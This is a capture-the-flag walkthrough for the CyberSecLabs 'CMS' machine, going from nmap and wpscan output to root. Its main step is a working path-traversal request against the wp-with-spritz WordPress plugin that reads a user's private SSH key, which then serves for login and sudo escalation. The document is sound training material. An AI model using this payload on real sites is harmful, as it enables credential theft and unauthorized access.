# CyberSecLabs : CMS

```zsh
nmap -sS -p- -Pn -r -v -T4 172.31.1.8
```
```zsh
nmap -sC -sV -p 22,80 -v 172.31.1.8
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 2a:da:3d:c8:51:73:2c:4e:f3:5e:95:4d:5c:b8:a0:7d (RSA) 
|   256 8d:22:9a:44:8c:d4:89:f7:d9:e2:51:db:18:eb:f6:5b (ECDSA)
|_  256 78:8e:46:d3:64:6a:5a:68:d2:09:4d:9d:3b:27:9f:be (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-generator: WordPress 5.3.2
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: CMS
|_https-redirect: ERROR: Script execution failed (use -d to debug)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

Visit port 80 , there will be a website there. Wordpress CMS . 

Important link and hint
```http://172.31.1.8/index.php/blog/```

Basically has a hint that a ssh login key ```id_rsa``` is located inside ```/home/angel/.ssh/``` with the permissions properly shown for the key.

Wpscan to find installed plugins:

```zsh 
wpscan --url http://172.31.1.8:80 --wp-content-dir /wp-content/ --enumerate ap --plugins-detection aggressive
```

Found 2
```
[+] akismet
 | Location: http://172.31.1.8/wp-content/plugins/akismet/
 | Last Updated: 2020-04-29T13:02:00.000Z
 | Readme: http://172.31.1.8/wp-content/plugins/akismet/readme.txt
 | [!] The version is out of date, the latest version is 4.1.5 
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://172.31.1.8/wp-content/plugins/akismet/, status: 200
 |
 | Version: 4.1.3 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://172.31.1.8/wp-content/plugins/akismet/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://172.31.1.8/wp-content/plugins/akismet/readme.txt

[+] wp-with-spritz
 | Location: http://172.31.1.8/wp-content/plugins/wp-with-spritz/
 | Latest Version: 1.0 (up to date)
 | Last Updated: 2015-08-20T20:15:00.000Z
 | Readme: http://172.31.1.8/wp-content/plugins/wp-with-spritz/readme.txt
 | [!] Directory listing is enabled
```
Look for this ```wp-with-spritz``` exploits

An RFI vulnerablity

```
https://www.exploit-db.com/exploits/44544
```
Visit the follwing link. To get the rsa-key 

```
http://172.31.1.8/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=/../../../..//home/angel/.ssh/id_rsa
``` 
Format it by clicking on view source , copy and save it in a file. 

Now login using the key

```zsh
ssh -i id-rsa angel@172.31.1.8
```
For privesc do ```sudo /bin/bash``` and you will be root.
